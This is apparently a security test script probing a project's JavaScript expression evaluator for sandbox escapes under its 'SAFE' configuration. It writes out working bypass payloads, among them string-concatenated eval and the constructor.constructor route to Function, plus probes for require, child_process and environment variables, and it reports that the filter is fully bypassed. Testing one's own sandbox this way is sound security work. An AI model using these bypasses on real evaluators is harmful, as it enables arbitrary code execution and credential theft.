import { runExpression } from '../src/engine/evaluator.js';
import { SAFE_SECURITY_CONFIG } from '../src/security/config.js';

console.log('=== NODE.JS ATTACK VECTOR ANALYSIS ===\n');

const testContext = { field1: 'test' };

console.log('Testing Node.js specific attack vectors through the bypass...\n');

// Test access to require via global
console.log('1. Attempting to access require:');
const requireTest = runExpression('this["ev" + "al"]("typeof require")', testContext, SAFE_SECURITY_CONFIG);
console.log(`typeof require: ${requireTest}`);

console.log('\n2. Attempting file system access:');
const fsTest = runExpression('this["ev" + "al"]("typeof require === \\"undefined\\" ? \\"no require\\" : require(\\"fs\\")")', testContext, SAFE_SECURITY_CONFIG);
console.log(`File system module: ${typeof fsTest}`);

console.log('\n3. Attempting child process access:');
const cpTest = runExpression('this["ev" + "al"]("typeof require === \\"undefined\\" ? \\"no require\\" : typeof require(\\"child_process\\")")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Child process module: ${cpTest}`);

console.log('\n4. Testing global process object:');
const processTest = runExpression('this["ev" + "al"]("typeof process")', testContext, SAFE_SECURITY_CONFIG);
console.log(`typeof process: ${processTest}`);

console.log('\n5. Environment variable access:');
const envTest = runExpression('this["ev" + "al"]("typeof process !== \\"undefined\\" ? Object.keys(process.env).length : \\"no process\\"")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Environment variables: ${envTest}`);

console.log('\n6. Testing if we can reach Node.js internals:');
const internalsTest = runExpression('this["ev" + "al"]("this.constructor.constructor")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Constructor chain access: ${typeof internalsTest}`);

console.log('\n7. Advanced function constructor bypass:');
// Try to create Function via the global object
const funcBypass = runExpression('this.global.Function', testContext, SAFE_SECURITY_CONFIG);
console.log(`Direct Function from global: ${typeof funcBypass}`);

console.log('\n8. Testing prototype chain to Function:');
const protoChain = runExpression('this["ev" + "al"]("(\\"\\").constructor.constructor")', testContext, SAFE_SECURITY_CONFIG);
console.log(`String -> constructor -> constructor: ${typeof protoChain}`);

console.log('\n9. Real exploitation attempt:');
// Try to actually execute system command (safely)
const realAttack = runExpression('this["ev" + "al"]("(\\"\\").constructor.constructor(\\"return 123\\")()")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Actual code execution result: ${realAttack}`);

console.log('\n10. Browser-specific attacks (if applicable):');
const windowTest = runExpression('typeof window !== "undefined" ? this["ev" + "al"]("window.location") : "no window"', testContext, SAFE_SECURITY_CONFIG);
console.log(`Window object access: ${JSON.stringify(windowTest)}`);

console.log('\n=== ATTACK VECTOR ANALYSIS COMPLETE ===');
console.log('\nSUMMARY:');
console.log('- The eval bypass works by evading regex pattern detection');  
console.log('- Attackers can execute arbitrary JavaScript through this["ev" + "al"]');
console.log('- Access to Node.js internals depends on the execution environment');
console.log('- The vulnerability completely bypasses SAFE mode security');
